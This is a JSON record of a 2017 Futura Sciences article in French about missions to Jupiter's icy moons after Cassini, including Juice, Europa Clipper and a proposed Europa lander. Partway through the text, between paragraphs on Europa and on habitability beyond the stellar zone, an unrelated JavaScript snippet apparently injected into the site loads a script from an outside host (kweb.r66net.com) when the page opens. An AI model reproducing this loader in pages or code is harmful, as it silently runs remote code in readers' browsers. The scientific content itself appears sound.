{"title": "Apres Cassini, rendez-vous sur les lunes glacees de Jupiter", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-09-18", "content": "Alors que la sonde Cassini a termine son aventure en plongeant dans Saturne, les scientifiques preparent deja les missions qui lui succederont. Si, techniquement, il est trop tot pour aller voir si Encelade ou Titan sont des mondes habites, les lunes glacees de Jupiter sont une priorite. Ce qu'il faut retenir La mission Cassini, c'est de nouvelles connaissances mais egalement de nouvelles questions. Si l'habitabilite d'Encelade ne fait plus guere de doute, il est trop tot pour aller y chercher une forme de vie. Les lunes glacees de Jupiter et Saturne : voila quel sera le prochain objectif des missions apres Cassini. Les agences spatiales n'ont pas attendu la fin de la mission Cassini pour savoir quoi faire apres. Un des objectifs de la sonde etait de caracteriser et decrire l'habitabilite de certains des satellites de  Saturne , dont ses  lunes  de glace. <<  C'est aujourd'hui chose faite  >>, nous explique Nicolas Altobelli, responsable scientifique de la  mission Cassini  pour l'Agence spatiale europeenne ( ESA ). Savoir s'il y a de <<  la vie dans le sous-sol d' Encelade  >> n'est pas l'etape suivante. D'une part, parce que cela est techniquement tres difficile et, d'autre part, parce que de nombreuses questions sur l'habitabilite des lunes glacees du  Systeme solaire  sont en suspens. Ainsi, ce qui a ete decide aujourd'hui, c'est de <<  continuer d'etudier l'habitabilite des lunes de glace plus en detail  >>. Si Cassini l'a bien fait pour  Encelade , en demontrant que ce monde est habitable, des <<  missions comme Juice et Europa Clipper, a destination d'autres mondes, sont tres attendues  >>. Elles embarquent en effet des instruments qui apporteront un eclairage significativement nouveau. Il n'y aura donc <<  pas de Cassini 2 dans l'esprit de la mission Cassini qui vient de se terminer et qui irait de nouveau etudier le systeme saturnien  >>. S'il devait y avoir de nouveau une mission de type Cassini, ou  Galileo  (quatorze ans dans le systeme  jovien ), pour une bonne partie de la communaute scientifique, il s'agira d'une mission d'envergure a <<  destination d' Uranus ou Neptune   par exemple >>, avec comme priorite l' << exploration des lunes de glace de ces deux mondes assez meconnus  >>. Cependant, ce n'est seulement que dans quelques annees que l'Agence spatiale europeenne etudiera les propositions de missions vers ces deux planetes et <<  decidera si, financierement et techniquement, une telle mission est possible  >>.  Vue externe d'Europe (a gauche) et structure interne probable de ce satellite de Jupiter (a droite). (c) Nasa, JPL                               De la vie possible loin des etoiles ? En attendant d'envoyer une sonde sur Encelade -- ou un  ballon  derivant au gre des courants d' air  dans l' atmosphere  de  Titan , voire un atterrisseur sur un de ses lacs (<<  pas avant la decennie 2040  >>) --, les agences spatiales vont se focaliser sur les lunes glacees de  Jupiter . Certaines, comme Europe et  Ganymede  (deux des quatre satellites galileens), abriteraient egalement un  ocean souterrain  (<<  on le suppose fortement  >>). Les scientifiques souhaitent aussi savoir si ces deux mondes sont habitables (<<  on n'en est pas completement certains  >>), voire habites.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Il y a egalement un autre interet a les etudier. En effet, s'il y a quelques annees, la recherche de la  vie extraterrestre  se focalisait sur des  exoplanetes  evoluant dans la <<  zone d'habitabilite  de leur etoile pour permettre a l'eau a l'etat  liquide  de rester stable sur la surface  >>, aujourd'hui, force est de constater que Galileo et Cassini ont <<  mis en evidence un autre type d'habitat  >>. Sous la surface de ces mondes, les oceans sont proteges des radiations, ce qui, du point de vue de l' exobiologie , elargit le champ des possibilites. <<  Vous n'avez plus besoin d'etre dans la zone d'habitabilite de l'etoile pour voir une forme de vie emerger.  >>  Pour repondre a ces questions, plusieurs missions sont en preparation, ou envisagees, avec des instruments qui seront capables de determiner l'habitabilite de ces mondes : en Europe, l'Agence spatiale europeenne developpe  Juice . Cette sonde doit aller etudier  Callisto  et Europe avant de terminer sa mission autour de Ganymede. Son lancement est prevu en 2022 et la sonde devrait atteindre Jupiter en 2030 ;  aux Etats-Unis, la Nasa va se focaliser sur Europe. Au debut de la decennie 2020, elle prevoit le lancement de la sonde  Europa Clipper , a destination d'Europe donc, son objectif principal ;  les Russes prevoient d'envoyer un atterrisseur se poser sur  Ganymede  (on sait que ce satellite possede un  champ magnetique  intrinseque genere par son noyau ou l'ocean global que l'on suppose exister sous sa surface) ;  une mission commune de l'ESA et de la Nasa a destination d'Europe est a l'etude. Provisoirement baptisee  Joint Europa Mission , elle aurait pour objectif de deposer un atterrisseur, qui fonctionnerait 35 jours, et de placer en  orbite  un satellite pour une mission de trois mois. ", "theme": "sciences"}